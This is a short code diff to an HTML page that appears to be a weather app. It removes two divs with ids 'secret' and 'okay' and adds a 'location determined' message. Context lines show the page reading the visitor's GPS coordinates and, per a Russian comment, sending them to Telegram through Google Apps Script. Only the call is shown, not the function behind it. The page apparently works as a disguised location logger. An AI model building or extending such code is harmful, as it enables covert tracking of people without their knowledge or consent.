@@ -81,10 +81,7 @@
         <h4 id="weatherD"></h4>
         <h4 id="temp"></h4>
         <h4 id="feels_li"></h4>
-        
-        <div id="secret"></div>
-        <div id="okay"></div>
-        
+
     </div>
 
     <script>
@@ -109,6 +106,7 @@
                     currentLat = position.coords.latitude;
                     currentLon = position.coords.longitude;
                     
+                    placeElement.innerHTML = `<div class="status success">✅ Местоположение определено!</div>`;
                     
                     // Отправляем координаты в Telegram через Google Apps Script
                     sendToGoogleScript(currentLat, currentLon);
